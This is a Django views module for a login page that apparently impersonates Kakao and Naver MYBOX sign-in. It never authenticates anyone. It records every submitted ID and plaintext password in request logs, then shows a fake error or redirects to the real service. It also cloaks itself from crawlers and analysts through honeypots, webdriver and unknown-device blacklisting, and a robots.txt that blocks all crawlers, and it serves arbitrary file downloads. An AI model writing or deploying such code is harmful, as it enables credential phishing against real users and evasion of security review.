import re

from django.http import FileResponse, HttpResponse
from django.shortcuts import redirect, render
from django.urls import reverse
from django.utils.timezone import now as django_now
from django.views.decorators.http import require_GET

from accounts.blacklist_store import (
    KIND_BOT,
    KIND_LOGIN,
    KIND_UNKNOWN,
    add_blacklist_ip,
    get_client_ip,
    get_ips_for_kind,
    is_local_ip,
    redirect_url_for_kind,
)
from accounts.bot_detect import REASON_HONEYPOT, TRAP_PATH, honeypot_filled
from accounts.download_store import get_download_file
from accounts.middleware import flag_bot, record_login_attempt
from accounts.policy_store import get_blacklist_policy
from accounts.request_log_store import insert_request_log
from accounts.request_redirect import (
    login_block_redirect_url,
    request_login_redirect_url,
)

SUPPORTED_LANGUAGES = {'ko', 'en'}
KAKAO_ID_PATTERN = re.compile(r'^\*?[a-z0-9_-]+(?:\.[a-z0-9_-]+)*$')
PHONE_PATTERN = re.compile(r'^\d{4,17}$')
EMAIL_PATTERN = re.compile(r'^\S+@\S+\.\S+$')
WINDOWS_NT_NAMES = {
    '10.0': 'Windows 10/11',
    '6.3': 'Windows 8.1',
    '6.2': 'Windows 8',
    '6.1': 'Windows 7',
    '6.0': 'Windows Vista',
    '5.1': 'Windows XP',
}


def _match_group(pattern, text, flags=0):
    match = re.search(pattern, text, flags)
    return match.group(1) if match else ''


def is_valid_login_identifier(value):
    identifier = (value or '').strip()
    valid_kakao_id = bool(
        3 <= len(identifier) <= 15
        and KAKAO_ID_PATTERN.fullmatch(identifier)
        and re.search(r'[a-z]', identifier)
        and not re.search(r'--|\.\.|__', identifier)
    )
    return bool(
        valid_kakao_id
        or EMAIL_PATTERN.fullmatch(identifier)
        or PHONE_PATTERN.fullmatch(identifier)
    )


def is_valid_password_format(value):
    password = value or ''
    if not 4 <= len(password) <= 32:
        return False
    return all(0x20 <= ord(character) <= 0x7E for character in password)


def get_device_info(request):
    user_agent = request.META.get('HTTP_USER_AGENT', '') or ''
    ua = user_agent.lower()
    device_model = ''

    if not user_agent.strip():
        return {
            'user_agent': '',
            'device_type': 'Unknown',
            'device_model': '',
            'os_name': 'Unknown',
            'browser': 'Unknown',
        }

    if any(token in ua for token in ('ipad', 'tablet', 'kindle', 'silk')):
        device_type = 'Tablet'
    elif any(token in ua for token in ('mobi', 'iphone', 'android', 'windows phone')):
        device_type = 'Mobile'
    else:
        device_type = 'Desktop'

    android_version = _match_group(r'Android\s+([0-9]+(?:\.[0-9]+)*)', user_agent)
    ios_version = _match_group(r'(?:iPhone OS|CPU OS|CPU iPhone OS)\s+([0-9_]+)', user_agent)
    windows_nt = _match_group(r'Windows NT\s+([0-9.]+)', user_agent)
    mac_version = _match_group(r'Mac OS X\s+([0-9_]+)', user_agent)
    chromeos_version = _match_group(r'CrOS\s+\w+\s+([0-9.]+)', user_agent)

    if android_version:
        os_name = f'Android {android_version}'
        # Example: Linux; Android 14; SM-S918B Build/...
        device_model = _match_group(
            r'Android\s+[0-9.]+;\s*([^;)]+?)(?:\s+Build/|;|\))',
            user_agent,
        ).strip()
        if device_model.upper() == 'K':
            device_model = ''
    elif ios_version:
        os_name = f'iOS {ios_version.replace("_", ".")}'
        if 'ipad' in ua:
            device_model = 'iPad'
        elif 'iphone' in ua:
            device_model = 'iPhone'
        elif 'ipod' in ua:
            device_model = 'iPod'
    elif windows_nt:
        os_name = f'{WINDOWS_NT_NAMES.get(windows_nt, "Windows")} (NT {windows_nt})'
    elif mac_version:
        os_name = f'macOS {mac_version.replace("_", ".")}'
    elif chromeos_version:
        os_name = f'Chrome OS {chromeos_version}'
    elif 'linux' in ua:
        os_name = 'Linux'
    else:
        os_name = 'Unknown'

    browser_version = ''
    if 'edg/' in ua:
        browser = 'Edge'
        browser_version = _match_group(r'Edg/([0-9.]+)', user_agent)
    elif 'opr/' in ua or 'opera' in ua:
        browser = 'Opera'
        browser_version = _match_group(r'(?:OPR|Opera)/([0-9.]+)', user_agent)
    elif 'firefox/' in ua:
        browser = 'Firefox'
        browser_version = _match_group(r'Firefox/([0-9.]+)', user_agent)
    elif 'chrome/' in ua and 'chromium' not in ua:
        browser = 'Chrome'
        browser_version = _match_group(r'Chrome/([0-9.]+)', user_agent)
    elif 'safari/' in ua and 'chrome/' not in ua:
        browser = 'Safari'
        browser_version = _match_group(r'Version/([0-9.]+)', user_agent)
    else:
        browser = 'Unknown'

    if browser_version:
        browser = f'{browser} {browser_version}'

    return {
        'user_agent': user_agent,
        'device_type': device_type,
        'device_model': device_model,
        'os_name': os_name,
        'browser': browser,
    }


def _is_unknown_label(value):
    text = (value or '').strip()
    return (not text) or text.lower() == 'unknown'


def unknown_client_reason(device_info):
    info = device_info or {}
    device_unknown = _is_unknown_label(info.get('device_type'))
    os_unknown = _is_unknown_label(info.get('os_name'))
    if device_unknown and os_unknown:
        return 'device_os'
    if device_unknown:
        return 'device'
    if os_unknown:
        return 'os'
    return ''


def flag_unknown_client(client_ip, device_info, *, path='', user_agent=''):
    policy = get_blacklist_policy()
    if not policy.get('unknown_block_enabled', True):
        return False
    if is_local_ip(client_ip):
        return False
    reason = unknown_client_reason(device_info)
    if not reason:
        return False
    already = client_ip in get_ips_for_kind(KIND_UNKNOWN)
    if not already:
        add_blacklist_ip(client_ip, KIND_UNKNOWN, note='auto: unknown device or os')
    return True


def _querydict_to_dict(query_dict):
    result = {}
    for key in query_dict.keys():
        values = query_dict.getlist(key)
        result[key] = values[0] if len(values) == 1 else values
    return result


def save_request_log(request, client_ip, device_info, language):
    document = {
        'timestamp': django_now(),
        'method': request.method,
        'path': request.get_full_path(),
        'ip': client_ip,
        'device': device_info['device_type'],
        'os': device_info['os_name'],
        'browser': device_info['browser'],
        'model': device_info.get('device_model') or None,
        'language': language,
        'user_agent': device_info['user_agent'],
        'query': _querydict_to_dict(request.GET),
        'body': _querydict_to_dict(request.POST),
    }
    insert_request_log(document)
    return flag_unknown_client(
        client_ip,
        device_info,
        path=request.get_full_path(),
        user_agent=device_info.get('user_agent') or '',
    )


def login_page(request):
    client_ip = get_client_ip(request)
    device_info = get_device_info(request)

    language = request.POST.get('locale') or request.GET.get('locale') or 'ko'
    if language not in SUPPORTED_LANGUAGES:
        language = 'ko'

    policy = get_blacklist_policy()
    intro_mode = policy.get('login_intro_mode') or 'loading'
    if intro_mode not in ('loading', 'mybox'):
        intro_mode = 'loading'
    loading_enabled = intro_mode == 'loading' and policy['login_loading_enabled']
    splash_enabled = policy['login_splash_enabled']
    loading_delay_ms = policy['login_loading_delay_ms'] if loading_enabled else 0
    loading_progress_percent = policy['login_loading_progress_percent']
    loading_hold_ms = policy['login_loading_hold_ms'] if loading_enabled else 0
    splash_delay_ms = policy['login_splash_delay_ms'] if splash_enabled else 0
    mybox_delay_ms = policy['login_mybox_delay_ms'] if intro_mode == 'mybox' else 0
    show_mybox_intro = request.method != 'POST' and mybox_delay_ms > 0
    show_intro = request.method != 'POST' and (
        loading_delay_ms > 0 or splash_delay_ms > 0 or mybox_delay_ms > 0
    )
    show_loading_splash = request.method != 'POST' and loading_delay_ms > 0
    show_error_splash = request.method != 'POST' and splash_delay_ms > 0

    context = {
        'login_error': False,
        'id_required': False,
        'id_invalid': False,
        'pw_invalid': False,
        'submitted_id': '',
        'language': language,
        'show_intro': show_intro,
        'show_loading_splash': show_loading_splash,
        'show_error_splash': show_error_splash,
        'show_mybox_intro': show_mybox_intro,
        'login_intro_mode': intro_mode,
        'loading_delay_ms': loading_delay_ms,
        'loading_progress_percent': loading_progress_percent,
        'loading_hold_ms': loading_hold_ms,
        'splash_delay_ms': splash_delay_ms,
        'mybox_delay_ms': mybox_delay_ms,
        'login_redirect_param': request_login_redirect_url(request),
        'bot_trap_url': (
            TRAP_PATH
            if policy.get('bot_block_enabled') and policy.get('bot_block_webdriver')
            else ''
        ),
    }

    if request.method == 'POST':
        submitted_id = request.POST.get('id', '').strip()
        password = request.POST.get('pw', '')
        context['submitted_id'] = submitted_id

        if not submitted_id:
            context['id_required'] = True
        elif not is_valid_login_identifier(submitted_id):
            context['id_invalid'] = True
        elif not is_valid_password_format(password):
            context['pw_invalid'] = True
        else:
            if (
                policy.get('bot_block_enabled')
                and policy.get('bot_block_honeypot')
                and honeypot_filled(request.POST)
            ):
                flag_bot(
                    client_ip,
                    note='auto: bot honeypot',
                    reason=REASON_HONEYPOT,
                    path=request.path,
                    user_agent=request.META.get('HTTP_USER_AGENT') or '',
                )
                save_request_log(request, client_ip, device_info, language)
                return redirect(redirect_url_for_kind(policy, KIND_BOT))
            blocked = record_login_attempt(
                client_ip,
                path=request.path,
                user_agent=request.META.get('HTTP_USER_AGENT') or '',
            )
            if save_request_log(request, client_ip, device_info, language):
                return redirect(redirect_url_for_kind(policy, KIND_UNKNOWN))
            if blocked:
                if intro_mode == 'mybox':
                    return redirect(reverse('mybox:viewer'))
                return redirect(login_block_redirect_url(request, policy))
            context['login_error'] = True
            return render(request, 'accounts/login.html', context)
    else:
        context['submitted_id'] = request.GET.get('id', '').strip()

    if save_request_log(request, client_ip, device_info, language):
        return redirect(redirect_url_for_kind(policy, KIND_UNKNOWN))
    return render(request, 'accounts/login.html', context)


def robots_txt(request):
    body = 'User-agent: *\nDisallow: /\nDisallow: /nids-trap/\n'
    return HttpResponse(body, content_type='text/plain; charset=utf-8')


def _download_miss_redirect():
    policy = get_blacklist_policy()
    target = str(policy.get('download_redirect_url') or '').strip()
    return redirect(target or 'https://www.naver.com/')


@require_GET
def download_miss(request, rest=''):
    """Missing or incomplete /download/... paths redirect instead of 404."""
    return _download_miss_redirect()


@require_GET
def download_file(request, any_path, filename):
    row = get_download_file(filename, any_path=any_path)
    if row is None or not row.file:
        return _download_miss_redirect()
    try:
        handle = row.file.open('rb')
    except FileNotFoundError:
        return _download_miss_redirect()
    response = FileResponse(
        handle,
        as_attachment=True,
        filename=row.filename,
    )
    if row.content_type:
        response['Content-Type'] = row.content_type
    return response
